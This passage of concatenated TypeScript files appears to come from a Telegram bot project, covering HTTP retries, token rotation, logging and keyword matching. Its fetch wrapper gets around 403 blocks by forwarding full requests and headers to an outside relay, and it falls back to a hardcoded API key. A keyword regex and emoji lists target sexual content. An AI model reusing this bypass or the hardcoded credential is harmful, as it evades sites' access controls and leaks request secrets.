(normActual.includes(normExpected)) return true;\n\n    // Sliding window with flexible length (expected  maxDiff)\n    const minLen = Math.max(normExpected.length - maxDiff, 1);\n    const maxLen = normExpected.length + maxDiff;\n\n    for (let len = minLen; len <= maxLen; len++) {\n        for (let i = 0; i <= normActual.length - len; i++) {\n            const substring = normActual.slice(i, i + len);\n            if (levenshteinDistance(substring, normExpected) <= maxDiff) {\n                return true;\n            }\n        }\n    }\n\n    return false;\n};","export function sleep(ms: number): Promise<void> {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nexport function contains(str: string | null | undefined, arr: string[]): boolean {\n  if (typeof str !== 'string' || !Array.isArray(arr) || arr.length === 0) return false;\n\n  const normalizedStr = str.trim().toLowerCase();\n\n  return arr.some(element =>\n    typeof element === 'string' &&\n    element.trim() !== '' &&\n    normalizedStr.includes(element.trim().toLowerCase())\n  );\n}\n\nexport function toBoolean(value: string | number | boolean | null | undefined): boolean {\n  if (value === null || value === undefined) return false;\n  if (typeof value === 'string') {\n    const normalizedValue = value.toLowerCase().trim();\n    return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';\n  }\n  if (typeof value === 'number') {\n    return value !== 0;\n  }\n  return value;\n}\n\nexport function fetchNumbersFromString(inputString: string | null | undefined): string {\n  if (!inputString) return '';\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  return matches ? matches.join('') : '';\n}\n\nexport const defaultReactions = Object.freeze([\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '', '',\n  '', '', '', '', '',\n  '', '', '', '', ''\n] as const);\n\nexport const defaultMessages = Object.freeze([\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n] as const);\n\nexport function areJsonsNotSame(json1: unknown, json2: unknown): boolean {\n  const keysToIgnore = ['id', '_id', 'createdAt', 'updatedAt', 'timestamp', 'time', 'date', 'timeStamp', 'created_at', 'updated_at'];\n  const MAX_DEPTH = 10;\n\n  function compare(obj1: unknown, obj2: unknown, path: string = '', depth: number = 0): boolean {\n    // Stop recursion at max depth\n    if (depth > MAX_DEPTH) {\n      console.log(`[DEPTH LIMIT] Reached max depth at path: ${path}`);\n      return obj1 !== obj2;\n    }\n\n    // Handle null/undefined\n    if (obj1 === null || obj1 === undefined || obj2 === null || obj2 === undefined) {\n      if (obj1 !== obj2) {\n        console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);\n        return true;\n      }\n      return false;\n    }\n\n    // Handle different types\n    if (typeof obj1 !== typeof obj2) {\n      console.log(`[MISMATCH] ${path}: type ${typeof obj1} !== ${typeof obj2}`);\n      return true;\n    }\n\n    // Handle non-objects (primitives)\n    if (typeof obj1 !== 'object') {\n      if (obj1 !== obj2) {\n        console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);\n        return true;\n      }\n      return false;\n    }\n\n    // Handle arrays\n    if (Array.isArray(obj1) && Array.isArray(obj2)) {\n      if (obj1.length !== obj2.length) {\n        console.log(`[MISMATCH] ${path}: array length ${obj1.length} !== ${obj2.length}`);\n        return true;\n      }\n\n      for (let i = 0; i < obj1.length; i++) {\n        const arrayPath = path ? `${path}[${i}]` : `[${i}]`;\n        if (compare(obj1[i], obj2[i], arrayPath, depth + 1)) {\n          return true;\n        }\n      }\n      return false;\n    }\n\n    // Handle array vs non-array\n    if (Array.isArray(obj1) || Array.isArray(obj2)) {\n      console.log(obj1, obj2);\n      console.log(`[MISMATCH] ${path}: one is array, other is not`);\n      return true;\n    }\n\n    // Handle objects\n    const record1 = obj1 as Record<string, unknown>;\n    const record2 = obj2 as Record<string, unknown>;\n\n    // Get all keys (excluding ignored ones)\n    const keys1 = Object.keys(record1).filter(key => !keysToIgnore.includes(key));\n    const keys2 = Object.keys(record2).filter(key => !keysToIgnore.includes(key));\n\n    // Check if different number of keys\n    if (keys1.length !== keys2.length) {\n      console.log(`[MISMATCH] ${path}: different key count ${keys1.length} !== ${keys2.length}`);\n      console.log(`[KEYS] obj1: [${keys1.join(', ')}]`);\n      console.log(`[KEYS] obj2: [${keys2.join(', ')}]`);\n      return true;\n    }\n\n    // Check if all keys from obj1 exist in obj2\n    for (const key of keys1) {\n      if (!keys2.includes(key)) {\n        console.log(`[MISMATCH] ${path}: key \"${key}\" missing in obj2`);\n        return true;\n      }\n    }\n\n    // Compare values for each key\n    for (const key of keys1) {\n      const keyPath = path ? `${path}.${key}` : key;\n      if (compare(record1[key], record2[key], keyPath, depth + 1)) {\n        return true;\n      }\n    }\n\n    return false;\n  }\n\n  const result = compare(json1, json2);\n  console.log(`[COMPARISON END] Result: ${result ? 'DIFFERENT' : 'SAME'}`);\n\n  return result;\n}\n\nexport function mapToJson<K extends string | number | symbol, V>(map: Map<K, V>): Record<string, V> {\n  if (!(map instanceof Map)) {\n    throw new Error('Input must be a Map instance');\n  }\n  const obj: Record<string, V> = {};\n  for (const [key, value] of map.entries()) {\n    obj[String(key)] = value;\n  }\n  return obj;\n}\n\nexport function shouldMatch(obj) {\n  const regex = /(wife|adult|lanj|chat||||lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i\n  const titleMatch = obj.title && regex.test(obj.title);\n  const usernameMatch = obj.username && regex.test(obj.username);\n  return !!(titleMatch || usernameMatch);\n}\n\nexport function parseObjectToString(obj: Record<string, unknown>) {\n  if (typeof obj !== 'object' || obj === null) {\n    return 'Invalid input: Not an object';\n  }\n  let result = '';\n  for (const key in obj) {\n    if (obj.hasOwnProperty(key)) {\n      result += `${key} : ${obj[key]}\\n`;\n    }\n  }\n  return result;\n}","import axios, { AxiosRequestConfig, AxiosResponse } from 'axios';\r\nimport { extractMessage, parseError } from './parseError';\r\nimport { clog } from './ChannelLogger';\r\nimport { sleep } from './common';\r\nimport { ChannelCategory } from '../components/bots/bots.service';\r\nimport { getBotsServiceInstance } from './bot.service.instance';\r\n\r\n// Configuration types\r\ninterface RetryConfig {\r\n  maxRetries: number;\r\n  baseDelay: number;\r\n  maxDelay: number;\r\n  jitterFactor: number;\r\n}\r\n\r\ninterface NotificationConfig {\r\n  enabled: boolean;\r\n  channelEnvVar: string;\r\n  timeout: number;\r\n}\r\n\r\n// Default configurations\r\nconst DEFAULT_RETRY_CONFIG: RetryConfig = {\r\n  maxRetries: 3,\r\n  baseDelay: 500, // Start with 500ms\r\n  maxDelay: 30000, // Cap at 30 seconds\r\n  jitterFactor: 0.2, // Add up to 20% jitter\r\n};\r\n\r\nconst DEFAULT_NOTIFICATION_CONFIG: NotificationConfig = {\r\n  enabled: true,\r\n  channelEnvVar: 'httpFailuresChannel',\r\n  timeout: 5000,\r\n};\r\n\r\n/**\r\n * Sends error notifications to configured channels\r\n * @param prefix - Notification message prefix\r\n * @param errorDetails - Error details to include in notification\r\n * @param config - Notification configuration\r\n * @returns Promise that resolves when notification is sent\r\n */\r\nasync function notifyInternal(\r\n  prefix: string,\r\n  errorDetails: { message: any; status?: number },\r\n  config: NotificationConfig = DEFAULT_NOTIFICATION_CONFIG,\r\n): Promise<void> {\r\n  if (!config.enabled) return;\r\n  prefix = `${prefix} ${process.env.clientId}`;\r\n  try {\r\n    const errorMessage =\r\n      typeof errorDetails.message === 'string'\r\n        ? errorDetails.message\r\n        : JSON.stringify(errorDetails.message);\r\n\r\n    const formattedMessage = errorMessage.includes('ETIMEDOUT')\r\n      ? 'Connection timed out'\r\n      : errorMessage.includes('ECONNREFUSED')\r\n        ? 'Connection refused'\r\n        : extractMessage(errorDetails?.message);\r\n\r\n    console.error(`${prefix}\\n${formattedMessage}`);\r\n    if (errorDetails.status === 429) return;\r\n    const notificationText = `${prefix}\\n\\n${formattedMessage}`;\r\n\r\n    try {\r\n      const botsService = getBotsServiceInstance();\r\n      await botsService.sendMessageByCategory(\r\n        ChannelCategory.HTTP_FAILURES,\r\n        notificationText\r\n      );\r\n    } catch (error) {\r\n      console.error(\r\n        'Failed to send notification:',\r\n        error.response?.data || error.message || error.code,\r\n      );\r\n    }\r\n  } catch (error) {\r\n    console.error(\r\n      'Error in notification process:',\r\n      error.response?.data || error.message || error.code,\r\n    );\r\n  }\r\n}\r\n\r\n/**\r\n * Common network errors that should trigger retries\r\n */\r\nconst RETRYABLE_NETWORK_ERRORS = [\r\n  'ETIMEDOUT',\r\n  'ECONNABORTED',\r\n  'ECONNREFUSED',\r\n  'ECONNRESET',\r\n  'ERR_NETWORK',\r\n  'ERR_BAD_RESPONSE',\r\n  'EHOSTUNREACH',\r\n  'ENETUNREACH',\r\n];\r\n\r\n/**\r\n * HTTP status codes that should trigger retries\r\n */\r\nconst RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];\r\n\r\n/**\r\n * Determines if an error should trigger a retry\r\n * @param error - The axios error\r\n * @param parsedError - Parsed error with status code\r\n * @returns boolean indicating whether to retry the request\r\n */\r\nfunction shouldRetry(error: unknown, parsedError: { status: number }): boolean {\r\n  if (axios.isAxiosError(error)) {\r\n    if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {\r\n      return true;\r\n    }\r\n\r\n    if (error.message?.toLowerCase().includes('timeout')) {\r\n      return true;\r\n    }\r\n  }\r\n\r\n  return RETRYABLE_STATUS_CODES.includes(parsedError.status);\r\n}\r\n\r\n/**\r\n * Calculates backoff time for retry attempts\r\n * @param attempt - Current attempt number (0-based)\r\n * @param config - Retry configuration\r\n * @returns Delay in milliseconds before next retry\r\n */\r\nfunction calculateBackoff(\r\n  attempt: number,\r\n  config: RetryConfig = DEFAULT_RETRY_CONFIG,\r\n): number {\r\n  const base = Math.min(\r\n    config.baseDelay * Math.pow(2, attempt),\r\n    config.maxDelay,\r\n  );\r\n  const jitter = Math.random() * (base * config.jitterFactor);\r\n  return Math.floor(base + jitter);\r\n}\r\n\r\n/**\r\n * Makes a request through a bypass service when regular requests fail with certain errors\r\n * @param url - Target URL\r\n * @param options - Request options\r\n * @returns Axios response from bypass service\r\n */\r\nasync function makeBypassRequest(\r\n  url: string,\r\n  options: AxiosRequestConfig & { bypassUrl?: string },\r\n): Promise<AxiosResponse> {\r\n  const bypassUrl = options.bypassUrl || process.env.bypassURL || '';\r\n\r\n  if (!bypassUrl) {\r\n    throw new Error('Bypass URL is not provided');\r\n  }\r\n\r\n  const finalBypassUrl = bypassUrl.startsWith('http')\r\n    ? bypassUrl\r\n    : 'https://helper-thge.onrender.com/execute-request';\r\n\r\n  const bypassAxios = axios.create({\r\n    responseType: options.responseType || 'json',\r\n    maxContentLength: Infinity,\r\n    maxBodyLength: Infinity,\r\n    timeout: options.timeout || 30000,\r\n  });\r\n\r\n  const response = await bypassAxios.post(\r\n    finalBypassUrl,\r\n    {\r\n      url,\r\n      method: options.method,\r\n      headers: options.headers,\r\n      data: options.data,\r\n      params: options.params,\r\n      responseType: options.responseType,\r\n      timeout: options.timeout,\r\n      followRedirects: options.maxRedirects !== 0,\r\n      maxRedirects: options.maxRedirects,\r\n    },\r\n    {\r\n      headers: {\r\n        'Content-Type': 'application/json',\r\n        'x-api-key': process.env.X_API_KEY || 'santoor',\r\n        ...options.headers,\r\n      },\r\n    },\r\n  );\r\n\r\n  // Handle binary responses\r\n  if (\r\n    response &&\r\n    (options.responseType === 'arraybuffer' ||\r\n      response.headers['content-type']?.includes('application/octet-stream') ||\r\n      response.headers['content-type']?.includes('image/') ||\r\n      response.headers['content-type']?.includes('audio/') ||\r\n      response.headers['content-type']?.includes('video/') ||\r\n      response.headers['content-type']?.includes('application/pdf'))\r\n  ) {\r\n    response.data = Buffer.from(response.data);\r\n  }\r\n\r\n  return response;\r\n}\r\n\r\n/**\r\n * Parses a URL and extracts host and endpoint information\r\n * @param url - URL to parse\r\n * @returns Object containing host and endpoint\r\n */\r\nfunction parseUrl(url: string): { host: string; endpoint: string } | null {\r\n  if (!url || typeof url !== 'string') {\r\n    return null;\r\n  }\r\n\r\n  try {\r\n    const parsedUrl = new URL(url);\r\n    return {\r\n      host: parsedUrl.host,\r\n      endpoint: parsedUrl.pathname + parsedUrl.search,\r\n    };\r\n  } catch (error) {\r\n    return null;\r\n  }\r\n}\r\n\r\n/**\r\n * Extended options for fetch requests\r\n */\r\ninterface FetchWithTimeoutOptions extends AxiosRequestConfig {\r\n  bypassUrl?: string;\r\n  retryConfig?: RetryConfig;\r\n  notificationConfig?: NotificationConfig;\r\n}\r\n\r\n/**\r\n * Makes HTTP requests with timeout handling and retry logic\r\n * @param url - Target URL\r\n * @param options - Request options with custom extensions\r\n * @returns Promise resolving to Axios response or undefined if all retries fail\r\n */\r\nexport async function fetchWithTimeout(\r\n  url: string,\r\n  options: FetchWithTimeoutOptions = {},\r\n  maxRetries?: number, // Kept for backward compatibility\r\n): Promise<AxiosResponse | undefined> {\r\n  console.log(`Fetching URL: ${url} with options:`, options);\r\n  // Input validation\r\n  if (!url) {\r\n    console.error('URL is empty');\r\n    return undefined;\r\n  }\r\n\r\n  // Merge default and custom configurations\r\n  const retryConfig: RetryConfig = {\r\n    ...DEFAULT_RETRY_CONFIG,\r\n    ...options.retryConfig,\r\n    maxRetries:\r\n      maxRetries !== undefined\r\n        ? maxRetries\r\n        : options.retryConfig?.maxRetries || DEFAULT_RETRY_CONFIG.maxRetries,\r\n  };\r\n\r\n  const notificationConfig: NotificationConfig = {\r\n    ...DEFAULT_NOTIFICATION_CONFIG,\r\n    ...options.notificationConfig,\r\n  };\r\n\r\n  // Initialize request options with defaults\r\n  options.timeout = options.timeout || 30000;\r\n  options.method = options.method || 'GET';\r\n\r\n  // Parse URL for error reporting\r\n  const urlInfo = parseUrl(url);\r\n  if (!urlInfo) {\r\n    console.error(`Invalid URL: ${url}`);\r\n    return undefined;\r\n  }\r\n\r\n  const { host, endpoint } = urlInfo;\r\n  const clientId = process.env.clientId || 'UnknownClient';\r\n\r\n  // Main retry loop\r\n  let lastError: Error | null = null;\r\n\r\n  for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {\r\n    // Create controller for this attempt\r\n    const controller = new AbortController();\r\n    const currentTimeout = options.timeout + attempt * 5000;\r\n\r\n    // Set up timeout to abort the request if it takes too long\r\n    const timeoutId = setTimeout(() => {\r\n      try {\r\n        controller.abort();\r\n      } catch (abortError) {\r\n        console.error('Error during abort:', abortError);\r\n      }\r\n    }, currentTimeout);\r\n\r\n    try {\r\n      // Make the request\r\n      const response = await axios({\r\n        ...options,\r\n        url,\r\n        signal: controller.signal,\r\n        maxRedirects: options.maxRedirects ?? 5,\r\n        timeout: currentTimeout,\r\n        headers: {\r\n          'Content-Type': 'application/json',\r\n          'x-api-key': process.env.X_API_KEY || 'santoor',\r\n          ...options.headers,\r\n        },\r\n      });\r\n\r\n      // Success! Clean up and return response\r\n      clearTimeout(timeoutId);\r\n      return response;\r\n    } catch (error) {\r\n      // Clean up timeout\r\n      clearTimeout(timeoutId);\r\n\r\n      // Process error and determine if retry is needed\r\n      lastError = error instanceof Error ? error : new Error(String(error));\r\n\r\n      // Try to parse the error for better handling\r\n      let parsedError;\r\n      try {\r\n        parsedError = parseError(\r\n          error,\r\n          `host: ${host}\\nendpoint:${endpoint}`,\r\n          false,\r\n        );\r\n      } catch (parseErrorError) {\r\n        console.error('Error in parseError:', parseErrorError);\r\n        parsedError = {\r\n          status: 500,\r\n          message: String(error),\r\n          error: 'ParseError',\r\n        };\r\n      }\r\n\r\n      // Extract message for notifications\r\n      const message = parsedError.message;\r\n\r\n      // Check if it's a timeout\r\n      const isTimeout =\r\n        axios.isAxiosError(error) &&\r\n        (error.code === 'ECONNABORTED' ||\r\n          (message && message.includes('timeout')) ||\r\n          parsedError.status === 408);\r\n\r\n      // Handle 403/495 with bypass\r\n      if (parsedError.status === 403 || parsedError.status === 495) {\r\n        try {\r\n          const bypassResponse = await makeBypassRequest(url, options);\r\n          if (bypassResponse) {\r\n            await notifyInternal(\r\n              `Successfully Bypassed the request`,\r\n              { message: `${clientId} host=${host}\\nendpoint=${endpoint}` },\r\n              notificationConfig,\r\n            );\r\n            return bypassResponse;\r\n          }\r\n        } catch (bypassError) {\r\n          let errorDetails;\r\n          try {\r\n            const bypassParsedError = parseError(\r\n              bypassError,\r\n              `host: ${host}\\nendpoint:${endpoint}`,\r\n              false,\r\n            );\r\n            errorDetails = extractMessage(bypassParsedError);\r\n          } catch (extractBypassError) {\r\n            console.error(\r\n              'Error extracting bypass error message:',\r\n              extractBypassError,\r\n            );\r\n            errorDetails = String(bypassError);\r\n          }\r\n\r\n          await notifyInternal(\r\n            `Bypass attempt failed`,\r\n            {\r\n              message: `host=${host}\\nendpoint=${endpoint}\\n${`msg: ${errorDetails.slice(0, 150)}\\nURL: ${url}`}`,\r\n            },\r\n            notificationConfig,\r\n          );\r\n        }\r\n      } else {\r\n        // Notify about the error\r\n        if (isTimeout) {\r\n          await notifyInternal(\r\n            `Request timeout on attempt ${attempt}`,\r\n            {\r\n              message: `${clientId} host=${host}\\nendpoint=${endpoint}\\ntimeout=${options.timeout}ms`,\r\n              status: 408,\r\n            },\r\n            notificationConfig,\r\n          );\r\n        } else {\r\n          await notifyInternal(\r\n            `Attempt ${attempt} failed`,\r\n            {\r\n              message: `${clientId} host=${host}\\nendpoint=${endpoint}\\n${`mgs: ${message.slice(0, 150)}`}`,\r\n              status: parsedError.status,\r\n            },\r\n            notificationConfig,\r\n          );\r\n        }\r\n      }\r\n\r\n      // Check if we should retry\r\n      if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {\r\n        const delay = calculateBackoff(attempt, retryConfig);\r\n        console.log(\r\n          `Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`,\r\n        );\r\n        await sleep(delay);\r\n        continue;\r\n      }\r\n\r\n      // If this is the last attempt, break out of the loop\r\n      if (attempt >= retryConfig.maxRetries) {\r\n        break;\r\n      }\r\n    }\r\n  }\r\n\r\n  // If we get here, all retries failed\r\n  try {\r\n    let errorData;\r\n    try {\r\n      if (lastError) {\r\n        const parsedLastError = parseError(\r\n          lastError,\r\n          `${clientId} host: ${host}\\nendpoint:${endpoint}`,\r\n          false,\r\n        );\r\n        errorData = extractMessage(parsedLastError);\r\n      } else {\r\n        errorData = 'Unknown error';\r\n      }\r\n    } catch (extractLastError) {\r\n      console.error('Error extracting last error:', extractLastError);\r\n      errorData = String(lastError) || 'Unknown error';\r\n    }\r\n\r\n    await notifyInternal(\r\n      `All ${retryConfig.maxRetries} retries exhausted`,\r\n      { message: `${errorData.slice(0, 150)}` },\r\n      notificationConfig,\r\n    );\r\n  } catch (finalError) {\r\n    console.error('Failed to send final error notification:', finalError);\r\n  }\r\n\r\n  // Return undefined to indicate failure\r\n  return undefined;\r\n}\r\n","export function getRandomEmoji(): string {\n    const eroticEmojis: string[] = [\"\", \"\", \"\", \"\", \"\", \"\", \" \", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"];\n    const randomIndex = Math.floor(Math.random() * eroticEmojis.length);\n    return eroticEmojis[randomIndex];\n}\n\nexport function getCuteEmoji(): string {\n    const girlishEmojis: string[] = [\n        \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\",\n        \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"\n    ];\n    const randomIndex = Math.floor(Math.random() * girlishEmojis.length);\n    return girlishEmojis[randomIndex];\n}\n\nexport function getRandomPetName(): string {\n    const cuteDesiEnglishPetNames: string[] = [\n        \"Cuti\", 'Cutie', \"Sweety\", \"Shinny\", 'Shiney', \"Bubli\",\n        \"Cuddly\", \"Sparkle\", \"Hunny\", \"Twinkle\", \"Bunni\", \"Cuppy\",\n        \"Jelly\", \"Rosy\", \"Starry\", \"Dolly\",\n        \"Pinku\", \"Glitzy\", \"Chirpy\", \"Mishu\", \"Dreamy\",\n        \"Lovely\", \"Puppy\", \"Kuttie\", \"Rinkly\", \"Bouncy\"\n    ];\n    const randomIndex = Math.floor(Math.random() * cuteDesiEnglishPetNames.length);\n    return cuteDesiEnglishPetNames[randomIndex];\n}","export * from './common';\r\nexport { fetchWithTimeout } from './fetchWithTimeout';\r\nexport { ppplbot } from './logbots';\r\nexport { parseError } from './parseError';\r\nexport * from './obfuscateText';\r\nexport * from './tg-apps';\r\nexport * from './telegram-utils'\r\nexport * from './logger'\r\nexport * from './bot.service.instance';\r\nexport * from './getRandomEmoji';\r\nexport * from './isPermanentError';\r\nexport * from './readbleTimeDifference'","import { contains } from \"./common\";\n\nexport default function isPermanentError(errorDetails: { error?: any, message: string, status?: number }): boolean {\n  const permanentErrors = [\n    'SESSION_REVOKED',\n    'AUTH_KEY_UNREGISTERED',\n    'USER_DEACTIVATED',\n    'USER_DEACTIVATED_BAN',\n    'FROZEN_METHOD_INVALID',\n  ];\n\n  // Check the parsed message\n  if (contains(errorDetails.message, permanentErrors) && !contains(errorDetails.message, ['INPUT_USER_DEACTIVATED'])) {\n    return true;\n  }\n\n  // Check raw error message (with proper optional chaining)\n  const rawMessage = errorDetails.error?.message || errorDetails.error?.errorMessage;\n  if (contains(rawMessage, permanentErrors) && !contains(errorDetails.message, ['INPUT_USER_DEACTIVATED'])) {\n    return true;\n  }\n\n  return false; //  Explicit return\n}","const getBotTokens = () => {\r\n    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\r\n    if (botTokens.length === 0) {\r\n        console.error('No bot tokens configured. Please set BOT_TOKENS environment variable');\r\n        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nlet botTokens: string[] | null = null;\r\nlet currentTokenIndex = 0;\r\n\r\nconst initializeBotTokens = () => {\r\n    if (botTokens === null) {\r\n        botTokens = getBotTokens();\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nexport function getBotToken() {\r\n    return initializeBotTokens()[currentTokenIndex];\r\n}\r\n\r\nexport function notifbot(chatId: string = process.env.accountsChannel || \"-1001801844217\", botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n\r\nexport function ppplbot(chatId: string = process.env.updatesChannel || '-1001972065816', botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n","import { Logger as NestLogger } from '@nestjs/common';\nimport chalk from \"chalk\";\nimport path from \"path\";\n// import fs from \"fs\";\n// import path from \"path\";\n\nexport class Logger extends NestLogger {\n    context?: string;\n    private logFilePath: string;\n\n    constructor(contextFile?: string) {\n        let localContext = contextFile;\n        try {\n            if (contextFile && typeof contextFile === \"string\") {\n                // Extract filename without extension\n                localContext = path.basename(contextFile, path.extname(contextFile));\n            }\n            \n        } catch (err) {\n            // Last fallback\n            localContext = \"Unknown\";\n        }\n        super(localContext);\n\n        chalk.level = 3; // force colors\n\n        // Create logs dir if not exists\n        // const logsDir = path.resolve(process.cwd(), \"logs\");\n        // if (!fs.existsSync(logsDir)) {\n        //     fs.mkdirSync(logsDir, { recursive: true });\n        // }\n\n        // // Dynamic file per service\n        // const safeContext = context?.replace(/[^a-zA-Z0-9-_]/g, \"_\") || \"general\";\n        // this.logFilePath = path.join(logsDir, `${safeContext}.log`);\n    }\n\n    private writeToFile(line: string) {\n        // try {\n        //     fs.appendFileSync(this.logFilePath, line + \"\\n\", \"utf8\");\n        // } catch (err) {\n        //     process.stderr.write(chalk.red(`[Logger File Error] ${err}\\n`));\n        // }\n    }\n\n    log(message: any, data: any = \"\") {\n        const line = this.formatMessage(\"LOG\", message, this.getLogColors(), data);\n        process.stdout.write(line + \"\\n\");\n        this.writeToFile(this.stripAnsi(line));\n    }\n\n    info(message: any, data: any = \"\") {\n        const line = this.formatMessage(\"INFO\", message, this.getInfoColors(), data);\n        process.stdout.write(line + \"\\n\");\n        this.writeToFile(this.stripAnsi(line));\n    }\n\n    error(message: any, data: any = \"\", trace?: any) {\n        const line = this.formatMessage(\"ERROR\", message, this.getErrorColors(), data);\n        process.stderr.write(line + (trace ? \"\\n\" + chalk.red.bold(trace) : \"\") + \"\\n\");\n        this.writeToFile(this.stripAnsi(line + (trace ? \"\\n\" + trace : \"\")));\n    }\n\n    warn(message: any, data: any = \"\") {\n        const line = this.formatMessage(\"WARN\", message, this.getWarnColors(), data);\n        process.stdout.write(line + \"\\n\");\n        this.writeToFile(this.stripAnsi(line));\n    }\n\n    debug(message: any, data: any = \"\") {\n        const line = this.formatMessage(\"DEBUG\", message, this.getDebugColors(), data);\n        process.stdout.write(line + \"\\n\");\n        this.writeToFile(this.stripAnsi(line));\n    }\n\n    verbose(message: any, data: any = \"\") {\n        const line = this.formatMessage(\"VERBOSE\", message, this.getVerboseColors(), data);\n        process.stdout.write(line + \"\\n\");\n        this.writeToFile(this.stripAnsi(line));\n    }\n\n    success(message: any, data: any = \"\") {\n        const line = this.formatMessage(\"SUCCESS\", message, this.getSuccessColors(), data);\n        process.stdout.write(line + \"\\n\");\n        this.writeToFile(this.stripAnsi(line));\n    }\n\n    /** ---------- COLORS ---------- */\n    private getLogColors() {\n        return { level: chalk.green, message: chalk.green, context: chalk.cyan.bold };\n    }\n    private getInfoColors() {\n        return { level: chalk.blue, message: chalk.blue, context: chalk.blue.bold };\n    }\n    private getErrorColors() {\n        return { level: chalk.red, message: chalk.red, context: chalk.red.bold };\n    }\n    private getWarnColors() {\n        return { level: chalk.yellow, message: chalk.yellow, context: chalk.yellow.bold };\n    }\n    private getDebugColors() {\n        return { level: chalk.magenta, message: chalk.grey, context: chalk.magenta.bold };\n    }\n    private getVerboseColors() {\n        return { level: chalk.gray, message: chalk.magenta, context: chalk.white.dim };\n    }\n    private getSuccessColors() {\n        return { level: chalk.greenBright, message: chalk.green.bold, context: chalk.green.bold };\n    }\n\n    /** ---------- FORMATTERS ---------- */\n    private formatMessage(level: string, message: any, colors: { level: any; message: any }, data?: any): string {\n        const safeLevel = typeof level === \"string\" && level.trim() !== \"\" ? level : \"UNKNOWN\";\n\n        const safeColors = {\n            level: typeof colors?.level === \"function\" ? colors.level : (txt: string) => txt,\n            message: typeof colors?.message === \"function\" ? colors.message : (txt: string) => txt,\n        };\n\n        const formattedMessage =\n            message !== undefined && message !== null\n                ? this.formatMultiColorMessage(message, safeColors.message)\n                : safeColors.message(\"[EMPTY MESSAGE]\");\n\n        const serviceCtx = this.context ? chalk.yellow(`[${this.context}]`) : \"\";\n\n        let extraCtx = \"\";\n        if (typeof data === \"object\" && data !== null) {\n            try {\n                extraCtx = this.formatObjectMessage(data);\n            } catch {\n                extraCtx = chalk.red(\"[Invalid Context Object]\");\n            }\n        } else if (typeof data === \"string\") {\n            extraCtx = this.parseColoredContext(data);\n        } else if (data !== \"\" && data !== undefined) {\n            extraCtx = chalk.yellow.bold(String(data));\n        }\n        if (extraCtx) extraCtx = \" \" + extraCtx;\n\n        const levelFormatted = safeColors.level(`[${safeLevel}]`);\n\n        return `${levelFormatted} ${serviceCtx} ${formattedMessage}${extraCtx}`;\n    }\n\n    private formatMultiColorMessage(message: any, levelColor: any): string {\n        if (typeof message === \"object\" && message !== null) {\n            return \"\\n\" + this.formatObjectMessage(message);\n        }\n\n        let formatted = String(message);\n        formatted = formatted.replace(/\\[([^\\]]+)\\]/g, chalk.cyan.bold(\"[$1]\"));\n        formatted = formatted.replace(/\\*\\*([^*]+)\\*\\*/g, chalk.white.bold(\"$1\"));\n        formatted = formatted.replace(/\\*([^*]+)\\*/g, chalk.yellow(\"$1\"));\n        // formatted = formatted.replace(/_([^_]+)_/g, chalk.underline(\"$1\"));\n\n        return levelColor(formatted);\n    }\n\n    private formatObjectMessage(obj: any, indent = 2, seen = new WeakSet()): string {\n        if (obj === null) return chalk.gray.bold(\"null\");\n\n        if (typeof obj !== \"object\") {\n            if (typeof obj === \"string\") return chalk.blueBright.bold(`\"${obj}\"`);\n            if (typeof obj === \"number\") return chalk.yellow.bold(obj);\n            if (typeof obj === \"boolean\") return chalk.magenta.bold(obj);\n            return chalk.cyanBright.bold(String(obj));\n        }\n\n        if (seen.has(obj)) return chalk.red(\"[Circular]\");\n        seen.add(obj);\n\n        if (Array.isArray(obj)) {\n            return (\n                \"[\\n\" +\n                obj.map((el) => \" \".repeat(indent) + this.formatObjectMessage(el, indent + 2, seen)).join(\",\\n\") +\n                \"\\n\" +\n                \" \".repeat(indent - 2) +\n                \"]\"\n            );\n        }\n\n        const entries = Object.entries(obj).map(([key, value]) => {\n            const coloredKey = chalk.cyan(`\"${key}\"`) + chalk.white(\": \");\n            const formattedValue = this.formatObjectMessage(value, indent + 2, seen);\n            return \" \".repeat(indent) + coloredKey + formattedValue;\n        });\n\n        return \"{\\n\" + entries.join(\",\\n\") + \"\\n\" + \" \".repeat(indent - 2) + \"}\";\n    }\n\n    private parseColoredContext(context: string): string {\n        if (/^\\d+$/.test(context)) return chalk.magentaBright.bold(context);\n        if (context === context.toUpperCase()) return chalk.yellow.bold(context);\n        return chalk.cyanBright.bold(context);\n    }\n\n    private 